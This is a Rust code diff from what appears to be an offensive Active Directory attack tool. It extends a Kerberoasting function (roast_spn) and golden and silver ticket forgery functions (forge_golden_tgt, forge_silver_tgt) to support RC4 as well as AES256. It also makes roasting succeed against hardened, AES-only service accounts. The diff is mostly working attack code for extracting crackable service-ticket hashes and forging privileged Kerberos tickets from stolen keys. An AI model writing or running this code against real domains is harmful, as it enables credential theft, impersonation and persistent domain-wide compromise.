@@ -52,6 +52,34 @@ fn aes256() -> Box<dyn Cipher> {
     CipherSuite::Aes256CtsHmacSha196.cipher()
 }
 
+/// A session key is RC4 (etype 23) when it's 16 bytes, else AES256 (etype 18) — so ticket
+/// consumers can encrypt/decrypt the AP-REQ authenticator / TGS-REP with the matching cipher.
+fn session_etype(key: &[u8]) -> u8 {
+    if key.len() == 16 {
+        ETYPE_RC4_HMAC
+    } else {
+        crate::ETYPE_AES256
+    }
+}
+fn enc_session(key: &[u8], usage: i32, data: &[u8]) -> Result<Vec<u8>> {
+    if key.len() == 16 {
+        Ok(crate::rc4::encrypt(key, usage, data, None))
+    } else {
+        aes256()
+            .encrypt(key, usage, data)
+            .map_err(|e| anyhow!("encrypt (AES): {e}"))
+    }
+}
+fn dec_session(key: &[u8], usage: i32, ct: &[u8]) -> Result<Vec<u8>> {
+    if key.len() == 16 {
+        crate::rc4::decrypt(key, usage, ct).map_err(|e| anyhow!("decrypt (RC4): {e}"))
+    } else {
+        aes256()
+            .decrypt(key, usage, ct)
+            .map_err(|e| anyhow!("decrypt (AES): {e}"))
+    }
+}
+
 impl Tgt {
     /// The TGT's encrypted enc-part ciphertext (EncTicketPart, sealed under the krbtgt key).
     pub fn ticket_cipher(&self) -> &[u8] {
@@ -419,8 +447,6 @@ pub async fn check_credential(
 
 /// Build a TGS-REQ for `spn` using the TGT, and return the crackable service-ticket hash.
 pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<String> {
-    let session = aes256();
-
     // Authenticator, encrypted under the TGT session key (usage 7).
     let authenticator = Authenticator::from(AuthenticatorInner {
         authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
@@ -435,13 +461,11 @@ pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<Str
     });
     let auth_der =
         picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("encode authenticator: {e}"))?;
-    let enc_auth = session
-        .encrypt(
-            &tgt.session_key,
-            TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR,
-            &auth_der,
-        )
-        .map_err(|e| anyhow!("encrypt authenticator: {e}"))?;
+    let enc_auth = enc_session(
+        &tgt.session_key,
+        TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR,
+        &auth_der,
+    )?;
 
     // AP-REQ carrying the TGT + encrypted authenticator.
     let ap_req = ApReq::from(ApReqInner {
@@ -451,7 +475,10 @@ pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<Str
             0, 0, 0, 0,
         ]))),
         ticket: ExplicitContextTag3::from(tgt.ticket.clone()),
-        authenticator: ExplicitContextTag4::from(encrypted_data(crate::ETYPE_AES256, enc_auth)),
+        authenticator: ExplicitContextTag4::from(encrypted_data(
+            session_etype(&tgt.session_key),
+            enc_auth,
+        )),
     });
     let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("encode AP-REQ: {e}"))?;
     let pa_tgs = PaData {
@@ -472,10 +499,12 @@ pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<Str
         till: ExplicitContextTag5::from(crate::far_future_time()),
         rtime: Optional::from(None),
         nonce: ExplicitContextTag7::from(nonce()),
-        // Prefer an RC4 service ticket ⇒ hashcat 13100.
-        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![
-            ETYPE_RC4_HMAC,
-        ])])),
+        // Offer RC4 (hashcat 13100) first, then AES256 (19700) — so AES-only service accounts
+        // (hardened / Server 2025 defaults) still return a ticket instead of KDC_ERR_ETYPE_NOSUPP.
+        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![
+            IntegerAsn1(vec![ETYPE_RC4_HMAC]),
+            IntegerAsn1(vec![crate::ETYPE_AES256]),
+        ])),
         addresses: Optional::from(None),
         enc_authorization_data: Optional::from(None),
         additional_tickets: Optional::from(None),
@@ -491,8 +520,8 @@ pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<Str
 
     let raw = picky_asn1_der::to_vec(&tgs_req).map_err(|e| anyhow!("encode TGS-REQ: {e}"))?;
     let resp = kdc_exchange(kdc, &raw).await?;
-    let tgs_rep: TgsRep = picky_asn1_der::from_bytes(&resp)
-        .map_err(|e| anyhow!("TGS-REP decode (KDC error): {e}"))?;
+    let tgs_rep: TgsRep =
+        picky_asn1_der::from_bytes(&resp).map_err(|_| anyhow!("TGS-REP: {}", krb_err(&resp)))?;
 
     // The crackable material is the *service ticket* enc-part.
     let tkt_enc = &tgs_rep.0.ticket.0 .0.enc_part.0;
@@ -547,9 +576,7 @@ pub async fn get_service_ticket(tgt: &Tgt, spn: &str, kdc: &str) -> Result<Servi
     // Reply enc-part is sealed under the TGT session key (usage 8). Windows tags it as either
     // EncTGSRepPart (26) or EncASRepPart (25) — accept both.
     let enc = &tgs_rep.0.enc_part.0.cipher.0 .0;
-    let plain = aes256()
-        .decrypt(&tgt.session_key, TGS_REP_ENC_SESSION_KEY, enc)
-        .map_err(|e| anyhow!("decrypt TGS-REP enc-part: {e}"))?;
+    let plain = dec_session(&tgt.session_key, TGS_REP_ENC_SESSION_KEY, enc)?;
     let kdc_rep = picky_asn1_der::from_bytes::<EncTgsRepPart>(&plain)
         .map(|p| p.0)
         .or_else(|_| picky_asn1_der::from_bytes::<EncAsRepPart>(&plain).map(|p| p.0))
@@ -612,10 +639,8 @@ pub fn build_ap_req_gss(st: &ServiceTicket) -> Result<(Vec<u8>, [u8; 16])> {
     });
     let auth_der =
         picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("authenticator: {e}"))?;
-    // Authenticator sealed under the *ticket session key* (usage 11).
-    let enc_auth = aes256()
-        .encrypt(&st.session_key, 11, &auth_der)
-        .map_err(|e| anyhow!("encrypt authenticator: {e}"))?;
+    // Authenticator sealed under the *ticket session key* (usage 11) — RC4 or AES per its etype.
+    let enc_auth = enc_session(&st.session_key, 11, &auth_der)?;
 
     let ap_req = ApReq::from(ApReqInner {
         pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
@@ -626,7 +651,10 @@ pub fn build_ap_req_gss(st: &ServiceTicket) -> Result<(Vec<u8>, [u8; 16])> {
             0, 0, 0, 0,
         ]))),
         ticket: ExplicitContextTag3::from(st.ticket.clone()),
-        authenticator: ExplicitContextTag4::from(encrypted_data(crate::ETYPE_AES256, enc_auth)),
+        authenticator: ExplicitContextTag4::from(encrypted_data(
+            session_etype(&st.session_key),
+            enc_auth,
+        )),
     });
     let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("AP-REQ: {e}"))?;
     Ok((crate::gss::spnego_krb5_init(&ap_der), subkey))
@@ -659,7 +687,6 @@ fn krb_err(resp: &[u8]) -> String {
 /// The AP-REQ (authenticator under the TGT session key) wrapped as PA-TGS-REQ — the
 /// authentication padata every TGS-REQ carries.
 fn ap_req_padata(tgt: &Tgt) -> Result<PaData> {
-    let session = aes256();
     let authenticator = Authenticator::from(AuthenticatorInner {
         authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
         crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)),
@@ -673,13 +700,11 @@ fn ap_req_padata(tgt: &Tgt) -> Result<PaData> {
     });
     let auth_der =
         picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("authenticator: {e}"))?;
-    let enc_auth = session
-        .encrypt(
-            &tgt.session_key,
-            TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR,
-            &auth_der,
-        )
-        .map_err(|e| anyhow!("encrypt authenticator: {e}"))?;
+    let enc_auth = enc_session(
+        &tgt.session_key,
+        TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR,
+        &auth_der,
+    )?;
     let ap_req = ApReq::from(ApReqInner {
         pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
         msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
@@ -687,7 +712,10 @@ fn ap_req_padata(tgt: &Tgt) -> Result<PaData> {
             0, 0, 0, 0,
         ]))),
         ticket: ExplicitContextTag3::from(tgt.ticket.clone()),
-        authenticator: ExplicitContextTag4::from(encrypted_data(crate::ETYPE_AES256, enc_auth)),
+        authenticator: ExplicitContextTag4::from(encrypted_data(
+            session_etype(&tgt.session_key),
+            enc_auth,
+        )),
     });
     let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("AP-REQ: {e}"))?;
     Ok(PaData {
@@ -877,9 +905,15 @@ fn forge_ticket(
     server_sig_key: &[u8],
     kdc_sig_key: &[u8],
     sname: &[&str],
+    rc4: bool,
 ) -> Result<Tgt> {
     let realm = realm.to_uppercase();
-    let pac_bytes = crate::pac::assemble_pac(id, server_sig_key, kdc_sig_key)?;
+    let pac_bytes = crate::pac::assemble_pac(id, server_sig_key, kdc_sig_key, rc4)?;
+    let etype = if rc4 {
+        ETYPE_RC4_HMAC
+    } else {
+        crate::ETYPE_AES256
+    };
 
     // authorization-data: AD-IF-RELEVANT(1) → [ AD-WIN2K-PAC(128) = pac ].
     let win2k = AuthorizationDataInner {
@@ -894,7 +928,8 @@ fn forge_ticket(
     };
     let auth: AuthorizationData = Asn1SequenceOf::from(vec![if_rel]);
 
-    let mut sk = vec![0u8; 32];
+    // Session key: 16 bytes for RC4 (etype 23), 32 for AES256 (etype 18).
+    let mut sk = vec![0u8; if rc4 { 16 } else { 32 }];
     rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut sk);
     let cname = principal(NT_PRINCIPAL, &[id.user.as_str()]);
 
@@ -904,7 +939,7 @@ fn forge_ticket(
             0x40, 0xe1, 0x00, 0x00,
         ]))),
         key: ExplicitContextTag1::from(EncryptionKey {
-            key_type: ExplicitContextTag0::from(IntegerAsn1(vec![crate::ETYPE_AES256])),
+            key_type: ExplicitContextTag0::from(IntegerAsn1(vec![etype])),
             key_value: ExplicitContextTag1::from(OctetStringAsn1(sk.clone())),
         }),
         crealm: ExplicitContextTag2::from(krb_string(&realm)),
@@ -923,15 +958,20 @@ fn forge_ticket(
     let etp_app: ApplicationTag<EncTicketPart, 3> = ApplicationTag(etp);
     let etp_der =
         picky_asn1_der::to_vec(&etp_app).map_err(|e| anyhow!("encode EncTicketPart: {e}"))?;
-    let enc = aes256()
-        .encrypt(ticket_key, 2, &etp_der) // key usage 2 = ticket enc-part
-        .map_err(|e| anyhow!("encrypt EncTicketPart: {e}"))?;
+    // key usage 2 = ticket enc-part.
+    let enc = if rc4 {
+        crate::rc4::encrypt(ticket_key, 2, &etp_der, None)
+    } else {
+        aes256()
+            .encrypt(ticket_key, 2, &etp_der)
+            .map_err(|e| anyhow!("encrypt EncTicketPart: {e}"))?
+    };
 
     let ticket = Ticket::from(TicketInner {
         tkt_vno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
         realm: ExplicitContextTag1::from(krb_string(&realm)),
         sname: ExplicitContextTag2::from(principal(NT_SRV_INST, sname)),
-        enc_part: ExplicitContextTag3::from(encrypted_data(crate::ETYPE_AES256, enc)),
+        enc_part: ExplicitContextTag3::from(encrypted_data(etype, enc)),
     });
 
     Ok(Tgt {
@@ -949,16 +989,18 @@ fn forge_ticket(
 pub fn forge_golden_tgt(
     id: &crate::pac::ForgeIdentity,
     realm: &str,
-    krbtgt_aes256: &[u8],
+    krbtgt_key: &[u8],
+    rc4: bool,
 ) -> Result<Tgt> {
     let realm_up = realm.to_uppercase();
     forge_ticket(
         id,
         realm,
-        krbtgt_aes256,
-        krbtgt_aes256,
-        krbtgt_aes256,
+        krbtgt_key,
+        krbtgt_key,
+        krbtgt_key,
         &["krbtgt", &realm_up],
+        rc4,
     )
 }
 
@@ -970,17 +1012,19 @@ pub fn forge_golden_tgt(
 pub fn forge_silver_tgt(
     id: &crate::pac::ForgeIdentity,
     realm: &str,
-    service_aes256: &[u8],
+    service_key: &[u8],
     spn: &str,
+    rc4: bool,
 ) -> Result<Tgt> {
     let comps: Vec<&str> = spn.split('/').collect();
     forge_ticket(
         id,
         realm,
-        service_aes256,
-        service_aes256,
-        service_aes256,
+        service_key,
+        service_key,
+        service_key,
         &comps,
+        rc4,
     )
 }
 
@@ -1008,8 +1052,8 @@ fn ccache_for(tgt: &Tgt, user: &str, server: &[&str]) -> Result<Vec<u8>> {
     write_principal(&mut c, NT_PRINCIPAL as u32, realm, &[user]); // client
     write_principal(&mut c, NT_SRV_INST as u32, realm, server); // server
 
-    // keyblock: keytype (AES256=18), etype(0), keylen, key
-    c.extend_from_slice(&(crate::ETYPE_AES256 as u16).to_be_bytes());
+    // keyblock: keytype (RC4=23 or AES256=18 per the session key), etype(0), keylen, key
+    c.extend_from_slice(&(session_etype(&tgt.session_key) as u16).to_be_bytes());
     c.extend_from_slice(&0u16.to_be_bytes());
     c.extend_from_slice(&(tgt.session_key.len() as u16).to_be_bytes());
     c.extend_from_slice(&tgt.session_key);
